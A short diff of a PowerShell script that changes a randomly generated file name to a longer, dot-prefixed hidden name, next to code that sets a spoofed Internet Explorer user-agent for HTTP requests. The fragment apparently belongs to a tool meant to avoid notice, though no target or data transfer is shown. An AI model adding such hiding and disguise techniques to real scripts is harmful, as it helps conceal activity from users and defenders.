@@ -103,7 +103,7 @@ $Rs1 = (-join ((65..90) + (97..122) | Get-Random -Count 16 | foreach {[char]$_})
 			return
 		}
 		else {
-			$FileName = (-join ((65..90) + (97..122) | Get-Random -Count 16 | foreach {[char]$_}))
+			$FileName = '.'+(-join ((65..90) + (97..122) | Get-Random -Count 32 | foreach {[char]$_}))
 				
 			$Headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
 			$Headers.Add("USER-AGENT", 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko')
